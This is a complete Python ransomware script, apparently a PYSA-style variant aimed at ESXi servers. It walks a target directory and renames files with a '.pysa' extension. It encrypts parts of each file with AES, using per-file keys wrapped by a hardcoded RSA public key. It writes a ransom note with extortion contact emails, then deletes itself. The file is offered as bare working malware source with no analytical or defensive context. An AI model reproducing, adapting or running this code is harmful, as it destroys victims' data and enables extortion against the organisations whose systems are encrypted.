import os
import sys
import pyaes
import rsa
from os import remove
from sys import argv

myExtension = "pysa"

try:
    FileNotFoundError
except NameError:
    FileNotFoundError = IOError


keydata = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAyn2fqJwfRkphNLDlivSH
ZASmQ9STaC5SUhL0kynnuDhgJeAtVsdnukmGAqadtxVm3cNG3pDmsfZXyqVe7ZBP
lDHG1PPRYz+10r8emj7Ejs1hNW7lZS1RLxi762wNBLS5G2mmpay/ypzAkjrQhwj7
MUQplbRMG7YW7pQxiF18bOE4PyOVaH1xDkkcQDy9TbC2W2R6dbM7Qsf54kPDGxdp
NJfGF+hMaUiRMM+DZzncqcvNudVxWyYO/8PzQ+ia4NxeljA9e4OnSijS7JFbthTe
SIPhiIUIsmgUPD17JhCnSuGPL4N4D9zl1lm/UzTrqn/S5OTPNyQrpk5Rrx80S1O7
as3INPDCcaiHq4N25n+yucb/jDlRmZqnBfLWUhaO1NGzcgknOYoC7e2lHK/EZpRa
fGoH0+JL+kMW8v2a2tqK/IpZNKs0U0Kkg3W1oRxmo29LmsS/cvKteNdiD9S27J9k
u6+JAKiEt3tVBvPjthYkoj0M3Pc0h7QKi5sLCW9MpUk5JP6upYXUml+hms/PdZTX
kkfeltZfxvkWJaC9CvOndk01zO31YtewHVlYAJVaODCh6bkaAeoW3/iVcbMEdBXc
ybMgLVGYIiYCbXq/CbHurMarsit22ORMFLTch0Fw3oUk6S4E0IQJguKbCGAuzgxH
qig0bNAfQr7SUQLw42MQEOMCAwEAAQ==
-----END PUBLIC KEY-----"""
pubkey = rsa.PublicKey.load_pkcs1_openssl_pem(keydata)


def cryptFile(filePath):
	try:
		fileSize = os.path.getsize(filePath)
		if(fileSize > 1024):
			newFilePath = filePath + "." + myExtension
			os.rename(filePath, newFilePath)
			if(os.path.isfile(newFilePath)):
				print("Process: " + newFilePath)
				file = open(newFilePath, "rb+")
				bufferSize = int(fileSize / 10);
				if (bufferSize > 6225920):
					bufferSize = 6225920
				maxCounter = int(fileSize / bufferSize)
				if(fileSize > 0 and fileSize < 1024):
					perc = 100
					div = int(100 / perc)
				elif fileSize >= 1024 and fileSize < 10000000:
					perc = 50
					div = int(100 / perc)
				elif fileSize >= 10000000 and fileSize < 10000000000:
					div = 2000
				elif fileSize >= 100000000 and fileSize < 100000000000:
					div = 10000
				elif fileSize >= 100000000000 and fileSize < 1000000000000:
					div = 15000
				else:
					div = 100000

				key = os.urandom(32)
				iv = os.urandom(16)
				keyEncrypted = rsa.encrypt(key, pubkey)
				ivEncrypted = rsa.encrypt(iv, pubkey)
				for j in range(0, maxCounter):
					if (j % div == 0):
						pos = int(j * bufferSize)
						file.seek(pos, 0)
						buffer = file.read(bufferSize)
						aes = pyaes.AESModeOfOperationOFB(key, iv = iv)
						bufferEncrypted = aes.encrypt(buffer)
						file.seek(pos, 0)
						file.write(bufferEncrypted)
				file.seek(fileSize, 0)
				file.write(keyEncrypted)
				file.write(ivEncrypted)
	except FileNotFoundError:
		print(filePath + " not found")
	except IOError:
		print(filePath + " IOError")
	except Exception as e:
		print(str(e))

def readMe(path):
	try:
		file = open(path + "/RECOVER_YOUR_DATA.txt","w")
		file.write("Hey Company,\n")
		file.write("Every byte on your ESXi has been encrypted.\n")
		file.write("To get all your data back contact us:\n")
		file.write("Lpyotr.barclay@protonmail.com\n")
		file.write("galetrendall@protonmail.com\n")
		file.close()
	except FileNotFoundError:
		a = 0
	except:
		a = 1

def main():
	path = argv[1]
	for r, d, f in os.walk(path):
		for file in f:
			filePath = os.path.join(r, file)
			fileName, ext = os.path.splitext(filePath)
			if(ext != '.pysa'):
				cryptFile(filePath)
	readMe("/")
	readMe(argv[1])
	remove(argv[0])
